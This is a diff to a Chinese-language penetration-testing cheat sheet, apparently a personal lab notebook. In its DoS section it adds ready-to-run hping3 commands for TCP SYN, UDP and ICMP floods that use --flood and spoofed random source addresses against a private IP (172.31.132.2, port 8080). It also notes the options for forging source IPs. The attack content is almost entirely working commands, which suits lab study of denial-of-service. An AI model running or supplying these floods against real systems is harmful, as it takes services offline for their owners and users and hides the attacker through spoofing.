@@ -319,11 +319,12 @@ exploit
 ```
 
 ## 3.11 Dos攻击
-### 3.11.1 DDos攻击
+### 3.11.1 DDos攻击（桥接模式+关闭防火墙）
 **Tcp syn DDos攻击**
 
 ```ZSH
 hping3 -S -c 30000 -d [发送数据包大小，如120] -i [发送数据包间隔，如u1000] -p [指定端口] [指定IP]
+hping3 -S --flood --rand-source -d 0 -p 8080 172.31.132.2
 ```
   - `-a`伪造IP攻击IP
   - `--rand-dest`随机目的地址模式
@@ -336,11 +337,13 @@ hping3 -S -c 30000 -d [发送数据包大小，如120] -i [发送数据包间隔
 
 ```ZSH
 hping3 --udp -c 30000 -d [发送数据包大小] -i [发送数据包间隔] -p [指定端口] [指定IP]
+hping3 --udp --flood --rand-source -d 0 -p 8080 172.31.132.2
 ```
 
 **ICMP DDos攻击**
 ```ZSH
 hping3 --icmp -c 30000 -d [发送数据包大小] -i [发送数据包间隔] -p [指定端口] [指定IP]
+hping3 --icmp --flood --rand-source -d 1000 172.31.132.2
 ```
 
 **计算攻击带宽**
